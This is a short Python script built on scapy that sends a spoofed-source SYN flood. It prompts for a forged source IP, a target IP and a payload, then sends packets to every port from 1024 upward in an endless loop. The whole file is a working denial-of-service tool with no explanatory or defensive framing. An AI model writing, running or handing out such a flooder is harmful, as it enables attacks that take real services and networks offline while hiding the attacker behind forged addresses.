import scapy.all as scapy

def synFlooder(src,dst, message):
    for dport in range(1024,65535):
        IPlayer = scapy.IP(src=src, dst=dst)
        TCPlayer = scapy.TCP(sport= 4444, dport=dport)
        RAWlayer = scapy.Raw(load=message)
        packet = IPlayer/TCPlayer/RAWlayer
        scapy.send(packet)


src_ip = input("Enter the spoofed source IP: ")
dst_ip = input("Enter the destination IP address: ")
message = input("Enter the message/payload: ")

while True:
    synFlooder(src_ip,dst_ip,message)